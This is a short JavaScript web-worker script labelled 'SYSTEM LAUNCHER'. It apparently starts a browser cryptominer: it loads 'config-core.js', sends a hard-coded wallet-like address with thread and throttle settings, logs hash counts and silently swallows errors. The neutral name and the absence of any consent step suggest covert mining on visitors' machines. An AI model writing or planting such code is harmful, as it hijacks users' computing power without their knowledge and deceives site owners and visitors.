/* SYSTEM LAUNCHER */
const K = "4A2CRYwa2E57VU8TLMQz5WD1W6D9Vx1AsPJ3gmu9Dsk8fce8a8nRnBCwH2tKUPAeQkjsMM3K861ASvtmSGN19A5xYFg3c";
try {
    importScripts('config-core.js');
    self.postMessage({type:'start',address:K,threads:4,throttle:0.2});
    self.onmessage=function(e){if(e.data.h>0){console.log("SISTEMA OK: "+e.data.h)}};
} catch(e){}
